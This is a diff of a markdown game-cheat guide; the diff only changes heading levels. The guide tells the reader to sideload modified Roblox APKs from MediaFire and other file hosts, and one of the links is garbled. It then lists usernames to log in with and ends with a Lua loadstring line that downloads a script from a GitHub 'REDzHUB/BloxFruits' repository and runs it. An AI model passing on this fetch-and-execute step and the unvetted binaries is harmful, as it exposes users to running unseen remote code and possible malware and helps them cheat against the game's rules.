@@ -1,4 +1,4 @@
-### Stage 1: Downloading
+## Stage 1: Downloading
 
 [Download 	
 Navigation Bar](https://now.gg/apps/roblox-corporation/5349/roblox.html](https://nu-nav-bar.en.uptodown.com/android/post-download/118821047)https://nu-nav-bar.en.uptodown.com/android/post-download/118821047)
@@ -14,7 +14,7 @@ Navigation Bar](https://now.gg/apps/roblox-corporation/5349/roblox.html](https:/
 [Download Roblox 4](https://www.mediafire.com/file/v1kpm767pj30nzy/Multi_by_EliteGamer_4-2.605.660.apk/file)
 
 
-### Stage 2: Logging in
+## Stage 2: Logging in
 
 ```
 MFPitchDev
@@ -29,7 +29,7 @@ OmarMehrath
 StrawHat_Mohamed
 ```
 
-### Stage 3: Executing
+## Stage 3: Executing
 
 ```lua
 loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
